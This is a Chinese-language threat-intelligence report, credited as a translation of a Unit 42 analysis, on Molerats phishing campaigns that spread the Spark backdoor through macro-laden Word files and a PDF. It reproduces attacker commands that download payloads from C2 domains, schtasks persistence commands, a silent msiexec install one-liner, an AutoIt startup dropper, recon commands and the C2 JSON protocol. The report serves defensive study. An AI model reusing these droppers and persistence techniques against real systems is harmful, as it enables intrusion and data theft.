**从2019年10月到2019年12月初研究人员发现多起网络钓鱼攻击事件与Molerats组织（又称AKA Gaza和Gaza
Cybergang）有关，其目标是政府、电信、保险和零售业等，涵盖6个不同国家的8个组织。保险和零售业目标不符合该组织先前设定的目标群，可能是为了混淆研究人员对该组织攻击目的的挖掘研究。**

##  综述

Molerats攻击都是通过网络钓鱼发送恶意文件，诱导用户单击链接下载恶意负载。大多数攻击的有效载荷是名为Spark的后门，攻击者可在被攻陷系统上执行命令。Spark后门至少从2017年就被启用，并与“Operation
Parliament”活动有关，该行动被认定与Gaza Cybergang有关。

Molerats早在2011年就已经开始攻击世界各地的政府组织，主要涉及非法访问和敏感数据收集。他们使用了大量的策略和技术，包括利用公开的后门工具，自我定制研发工具等。该组织主要利用社会工程学和鱼叉式钓鱼作为攻击切入手段，然后通过C2服务器下载恶意负载。该组织使用了多种技术手段使检测和分析变得更加困难，Spark
C2通道利用3DES或AES加密HTTP POST请求和响应数据来逃避检测，并且随机生成的密钥对于每个有效载荷都是唯一的。

##  发现过程

2019年11月，研究人员发现一封针对沙特***政府组织的网络钓鱼邮件。此攻击附件为已加密码的Microsoft
Word文档，该文档包含嵌入的宏。文件的密码在邮件正文中提供给受害目标，深入研究发现该攻击活动由Molerats发起。此外还找到从10月2日到12月9日发送的几次攻击邮件。这些电子邮件被发送到政府和电信组织，并定制了电子邮件主题和附件文件名。攻击活动还涉及两个总部位于美国的组织，一个在零售业，另一个在保险业。

附件大多数是Word文件，另外还有一个PDF文件。表1为此攻击活动中的电子邮件列表，包括电子邮件的详细信息以及目标组织的国家和行业。本文将分析表1中七个文档中的三个。

###
![](https://image.3001.net/images/20200310/1583809420_5e67038c7b9e1.png!small)MOFA.doc
文件分析

收集和分析的第一个文档名为MOFA-061019.doc（SHA256:03be1d7e1071b018d3fbc649678fd7234b0b6d3614bec5b482f3bf95ae***6）。此文档密码Abdullah@2019。文档内容看起来丢失的图像，如图1所示。

![](https://image.3001.net/images/20200310/1583809510_5e6703e6cea2a.png!small)

一旦受害者在文档中启用了宏，宏将解码VBScript（T1064）并将其保存到C:\
programdata\Michorsoft\Microsoft.vbs。Microsoft.vbs脚本将访问C2域servicebios[.]com下载第二个VBScript。该脚本从‘[https://servicebios](https://servicebios/)[.]com/PlayerVLC.vbs’下载辅助VBScript并保存到C:\ProgramData\PlayerVLC.vbs。

然后，初始VBScript将通过运行以下命令创建一个计划任务（T1053），每分钟持续运行辅助VBScript：

    
    
    schtasks/create/sc minute/mo 1/tn PlayerVLC/F/tr C:\ProgramData\PlayerVLC.vbs

辅助VBScript尝试从以下URL下载可执行负载，并将其保存到C:\ProgramData\PlayerVLC.msi。

[](https://servicebios/)

    
    
    [https://servicebios](https://servicebios/)[.]com/PlayerVLC.msi

下载可执行负载后，辅助VBScript运行以下命令终止任何有msiexec.exe的进程，并休眠两秒钟，然后使用合法的msiexec.exe应用（T1218）启动下载的PlayerVLC.msi文件：

    
    
    %comspec%/c taskkill/F/IM msiexec.exe&ping 127.0.0.1-n 2>NUL&msiexec/ic:\ProgramData\PlayerVLC.msi/quiet/qn/norestart

目前无法获取PlayerVLC.msi文件，它不再由C2服务器托管。

###  attachment.doc 文件分析

2019年10月31日和11月2日发现的Word文档（SHA256:eaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000）attachment.doc，其试图诱使收件人单击“启用内容”按钮来运行宏。图2显示了诱骗图像，这些文件没有密码保护。

![](https://image.3001.net/images/20200310/1583809907_5e6705739515f.png!small)

宏非常简单，从以下Google存储器下载base64编码的可执行文件，并将其解码并保存到%TEMP%\rundll64.exe：

    
    
    hxxps://drive.google[.]com/uc？export=下载&id=1yiDnuLRfQTBdak6S8gKnJLEzMk3yvepH

解码的可执行文件（SHA256:7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128P）是一个AutoIt脚本，它将可执行文件下载到%userprofile%\runawy.exe并运行。退出前AutoIt脚本还将可执行文件复制到启动目录并创建计划任务来确保持续运行：

    
    
    SCHTASKS/Create/f/SC minute/TN“runawy）/mo 5/tr“%userprofile%\runawy.exe”

runawy.exe文件（SHA256:64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431）是一个包含Enigma的有效负载，它创建一个互斥锁“S4.4P”，其配置如下：

    
    
    {“sIt”：“nysura[.]com”，“QrU”：“/”，“JJDF”：80，“MJOu”：0，“TuS”：，“pJhC”：1，“Lm”：“NMRm3AlaGUeT2g9iA2lNTIk04vSj8r2IBUDEvItgOxw=”，“LPO”：10000}

###  Pictures PDF 文件分析

名为“Pictures.PDF”的PDF文档（SHA256:9d6ce7c585609b8b23703617ef9d480c1cfe0f3bf6f57e178773823b8bf86495）附在一封主题为“صورك
<redacted> مع هبة”邮件上。PDF文档包含一条消息，旨在强制收件人单击链接安装恶意负载。

此PDF文档与doc中的宏病毒不同，其中包含一条勒索消息，试图诱骗用户单击链接、打开RAR并运行可执行文件。图3显示了PDF文档中的内容。

![](https://image.3001.net/images/20200310/1583810368_5e67074073239.png!small)

链接指向以下URL：

    
    
    hxxps://zmartco[.]com/Pictures.rar

“Pictures.rar” (SHA256:
1742caf26d41641925d109caa5b4ebe30cda274077fbc68762109155d3e0b0da)中包含‘
الصور.exe ’(SHA256:

92d0c5f5ecffd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7)，它是一个已编译的AutoIt脚本，可提取嵌入的可执行文件，将其保存到

C:\Users\Public\pdf.exe（SHA256:5139a334d5629c598325787fc43a2924d38d3c005bffd93afb7258a4a9a8d8b3）中，在“开始”菜单中创建快捷方式以在每次系统启动时自动启动，如下所示：

    
    
    #NoTrayIcon
    FileInstall("pdf.exe", "C:\Users\Public\" & "/pdf.exe")
    $cmd1 = "C:\Users\Public\" & "\pdf.exe"
    RunWait(@ComSpec & " /c start " & $cmd1, "", @SW_HIDE)
    FileCreateShortcut("C:\Users\Public\" & "\pdf.exe", @StartupDir & 
    "\pdf.lnk")

pdf.exe配置如下：

    
    
    {“xBql”:”laceibagrafica[.]com”,”eauy”:”/”,”Qnd”:80,”jJN”:0,”rlOa”:””,”Eb”:1,”BGa”:”vcJbq6nzgJk=”,”qJk”:10000}

##  基础设施

下图是一个maltego图表，显示了与servicebios[.]com域相关的Word文档和Visual Basic脚本（vbs）文件。

![](https://image.3001.net/images/20200310/1583810735_5e6708af61b73.png!small)

研究中发现Windows进程（wscript.exe）启动恶意VBS下载脚本，从中发现了“ MOFA-101019.doc”（SHA256：ddf938508618ffff7f147b3f7c2b706968cace33819e422fe1daae78bc256f75a8）文档等新的文档信息。与原始Word文档一样，新文档中的宏代码也使用了Motobit中的开源代码“Base64
decode VBS function”来解码（T1027），然后再运行它。

研究发现另外两个VBS文件：第一阶段的VBS（SHA256:85631021d7e84dc466b23cf77dd949ebc61011a52c1f0fb046cfd62dd9192a15）下载程序，其中对所用域和文件名的细微更改：

[](https://dapoerwedding/)

    
    
    [https://dapoerwedding](https://dapoerwedding/)[.]com/GoogleChrome.vbs

第二个VBS文件（SHA256:9451a110f75cbc3b66af5acb11a07a8d5e20e15e5487292722e695678272bca7）是第二阶段的VBS下载程序：

[](https://dapoerwedding/)

    
    
    [https://dapoerwedding](https://dapoerwedding/)[.]com/GoogleChrome.msi

在对dapoerwedding[.]com和servicebios[.]com的初步检查中，没有发现与先前记录关联，但是这两个域之间有一些共同点：

> 1、先前已经存在的域
>
> 2、看似合法的历史内容
>
> 3、最近即将到期
>
> 4、注册人是NameCheap, Inc
>
> 5、Sectigo颁发的域验证SSL证书

另一个域zmartco[.]com与上一节讨论的的“Pictures.pdf”附件具有共同点。

##  Spark

Spark是由AutoIt脚本安装的可执行文件，它是Molerats在许多攻击活动中使用的后门，Cybereason最近将其命名为“
Spark”。根据研究，至少从2017年初开始Molerats就使用了Spark后门。

Spark使用HTTP
POST与C2服务器通信来接收命令并发送结果。研究中发现攻击者使用了Enigma，Themida和VMProtect来保护恶意程序，使样本识别变得困难，还发现二进制文件中留下的两个不同版本的Spark标识符，分别是2.2版和4.2版。版本2.2是在2017年创建的，版本4.2是在2019年12月下旬和2020年1月创建的。表2显示了这些版本的Spark，以及它们的编译时间和用于混淆内容的打包程序。

![](https://image.3001.net/images/20200310/1583811760_5e670cb0d9f59.png!small)已经收集了数十个Spark样本，其编译时间从2017年3月到2020年1月，表3为Spark相关的C2域。

###
![](https://image.3001.net/images/20200310/1583811849_5e670d094a1df.png!small)2019年11月Pictures.pdf中的Spark

AutoIt脚本安装的Spark与Enigma打包在一起。
攻击者使用了Enigma中称为“[闪屏](https://enigmaprotector.com/en/help/manual/3fb53859f328dbe43332a934a9054fd1)”的功能，在所有窗口顶部显示图像，并等待用户单击该图像，然后再执行恶意代码。
图5显示了Enigma在执行恶意负载之前显示的启动图像。 闪屏功能可作为逃避沙箱的技术，因为它要求用户在恶意代码运行之前以单击屏幕进行交互。

![](https://image.3001.net/images/20200310/1583822563_5e6736e3bc4e0.png!small)

Spark是一个后门，它允许攻击者在受感染的系统上运行程序并执行命令。它首先检查GetKeyboardLayoutList的结果以及GetLocaleInfoA返回的语言名称，确保它们包含单词“
arabic”。如果在这两个API调用的结果中未找到该单词，则负载不执行其任何恶意代码。负载确认系统已安装了目标的键盘和语言包后，它将开始尝试与指定的C2服务器进行通信。有效负载通过使用自定义XOR解密配置文件，将生成base64编码密钥的SHA256哈希，使用所得哈希的第4至第28个字节作为最终密钥。负载将对64位密文进行base64解码，并使用Triple
DES（3DES）解密解码后的密文，从而得到JSON结构化配置。此负载具有下表3中所示的键值。

![](https://image.3001.net/images/20200310/1583822837_5e6737f53f886.png!small)表4中的每个值对于每个Spark示例都是唯一的，开发人员会更改每个负载的名称和键。

![](https://image.3001.net/images/20200310/1583822896_5e6738302bc7d.png!small)在与C2服务器通信之前，负载将解密另一个缓冲区，该缓冲区包含调试信息和系统信息收集命令。
表5显示了解密的字符串及其用途。

![](https://image.3001.net/images/20200310/1583823001_5e67389964984.png!small)

###  Spark C2通信

负载通过HTTP POST请求以及其数据中的base64编码和加密消息与C2服务器lactibagrafica [.] com通信。
图6显示了负载发送到其C2服务器的初始信标。

![](https://image.3001.net/images/20200310/1583823109_5e6739056eadf.png!small)初始信标中的数据解码解密后为JSON消息{“
CallieVK”：“ W10 =”，“ ReeceWNM”：“ Jessicay”}。 JSON消息包含两个键/值对，“ ReeceWNM”和“
CallieVK”，其值分别传输通信类型和数据。 图7显示了从C2服务器对初始信标的响应，该响应解密为{“ EverlyY”：0}。

![](https://image.3001.net/images/20200310/1583823202_5e6739628a4b6.png!small)收到EverlyY响应后，负载将通过“
cmd.exe”运行以下命令收集系统信息，特别是用户名，主机名和系统特定的UUID：

    
    
    wmic csproduct get UUID | more +1 | cmd /q /v:on /c “set/p .=&echo(!.!”    
    
        
    
            hostname    
    
        
    
            echo %username%

负载将以base64编码将结果以JSON格式存储在“ ZaydenlnL”中，“ AngelxEv”表示数据类型，如下所示：

    
    
    {“Maximiliano”:[{“AngelxEv”:1,”Houstonod”:1,”ZaydenlnL”:”<base64 encoded ciphertext of UUID>”},{“AngelxEv”:3,”Houstonod”:1,”ZaydenlnL”:”<base64 encoded ciphertext of username>”},{“AngelxEv”:2,”Houstonod”:1,”ZaydenlnL”:”<base64 encoded ciphertext of hostname>”}]}

生成的JSON数据base64编码，加密后通过HTTP POST发送到C2服务器，如图8所示。

![](https://image.3001.net/images/20200310/1583823468_5e673a6ca76b8.png!small)发送系统信息后，负载将从C2服务器接收命令。
图9显示了对此请求的响应，其中包含执行命令的加密数据。

![](https://image.3001.net/images/20200310/1583845755_5e67917b1fbd0.png!small)负载中没有命令处理程序，它将通过调用CreateProcessW
API函数来处理C2响应中的JSON对象。 JSON对象包含“ Jordanlzw”数组，该数组具有一个或多个对象，在“
Alanih”字段中为应用程序名称，以及要传递到“ TrumanRd”字段中应用程序的命令行参数。图9中解密后的响应包含一个JSON对象，它将运行“
whoami”命令 ：

    
    
    {“Aryana”: 0, “Jordanlzw” :[{“Ivory” : 5, “Jonas” : true, “Reginacy” : false, “TrumanRd” : “/NKg0zJdCDP1XlK9NJ4eJA==”, “Alanih” : “i8KOnxchf86h8NKfF45XMETHhwTx6yF3AfMoWzyG9wA=”, “LondonzO” : true}]}

运行C2命令后，负载将向C2服务器发送消息，该消息是向服务器发送特定的任务标识符来通知C2已接收到命令。 数据如以下JSON所示：

    
    
    {“CallieVK”:”eyJKYXNlTiI6W3siTGF3cmVuY2UiOjV9XX0=”,”ReeceWNM”:”MorganE”}

“ CallieVK”字段中包含“ JaseN”的JSON数组，其中有一个或多个对象，这些对象的字段名称为“
Lawrence”，其中包含接收到的任务编号，例如{“JaseN”:[{“Lawrence”:5}]}。 具体如图10所示：

![](https://image.3001.net/images/20200310/1583846063_5e6792af6f7c9.png!small)确认收到命令后，C2使用“
Allier”数字字段（例如{“ Allier”：7}）的JSON对象进行响应。 图11显示了包含“ Allier”字段的base64编码密文。

![](https://image.3001.net/images/20200311/1583900248_5e68665814cd5.png!small)在接收到“Allier”后，负载将把命令结果发送到C2服务器。当C2发出的“whoami”命令的结果为“test
system\<redacted>”时，生成的JSON如下所示：

    
    
    {“Zeke”:[{“FrederickT”:”5yUu16Ae8WKt<redacted>”,”KaileeXws”:true,”ReesefP”:5}]}

base64编码此数据，将“CallieVK”字段设置为“Winston”，如下所示：

    
    
    {“CallieVK”:”eyJaZWtlIjpbeyJGcmVkZXJpY2tUIjoiNXlVdTE2QWU4V0t0aX<redacted>0iLCJLYWlsZWVYd3MiOnRydWUsIlJlZXNlZlAiOjV9XX0=”,”ReeceWNM”:”Winston”}

加密JSON发送到C2服务器，图12显示了加密JSON的HTTP POST请求。

![](https://image.3001.net/images/20200311/1583900621_5e6867cd10ffe.png!small)在发送初始命令结果后，C2用JSON应答，图13显示了C2服务器用“Garrison”字段响应。

![](https://image.3001.net/images/20200311/1583900687_5e68680f5863e.png!small)

这之后负载将进入循环，连续发送HTTP请求以获得额外的命令。此循环以“vanesafm”通信类型开始，如下所示：

    
    
    {“CallieVK”:”eyJBZGVsaW5lUkQiOiJ2Y0picTZuemdKaz0iLCJBdmVyaXp0IjoiMSIsIkJyYW5kZW50bEsiOjEsIk1hdGhpYXNOYm8iOlt7IkFkYWx5bm5nUyI6MSwiQ29sbGluc1BNIjoiS1Q2TloyMVNGTVQ5WHFuZVM3MjJmZkVucG1FUFVZcDBqcDFFTXRaVEtyUmNNWkVFWG56QnZnPT0iLCJOZXZhZWgiOnRydWV9XX0=”,”ReeceWNM”:”VanessaFM”}

“CallieVK”字段表示JSON字段数，其中有“MathiasNbo”来传输UUID，“AdelineRD”包含昵称或活动标识符值。生成的JSON如下所示：

    
    
    {“AdelineRD”：“vcJbq6nzgJk=”，“Averizt”：“1”，“BrandentlK”：1，“MathiasNbo”：[{“adalyngs”：1，“CollinsPM”：“<ZaydenlnL字段中看到的UUID的base64编码密文>”，“Nevaeh”：true}]}

该JSON被加密，base64被编码并发送到C2服务器，如图14所示。

![](https://image.3001.net/images/20200311/1583900948_5e6869149ce33.png!small)

##  2019年和2020年活动比较

2019年1月的文档自包含负载，而2019年10月、2019年11月和2020年1月文档需要与远程服务器交互。2019年10月和2020年1月的文档有所不同，前者从服务器下载VBScript，2020年1月的文档尝试从Google
Drive加载下载有效负载。这些文档安装的Spark也各不相同。

##  总结

Molerats又称Gaza Hacking Team和Gaza
Cybergang，从2019年10月到2019年12月初，一直针对政府、电信、保险和零售业，涉及6个不同国家的8个组织。该组使用钓鱼邮件发送恶意Word和PDF文档，并通过社会工程学攻击感染目标。该组织在攻击中使用了Spark后门，该工具仍在继续开发中。

##  IoCs

> 本文涉及样本信息可见：<https://unit42.paloaltonetworks.com/molerats-delivers-spark-> backdoor/>

 ***参考来源：[unit42](https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/)，由Kriston编译，转载请注明来自FreeBuf.COM**

  

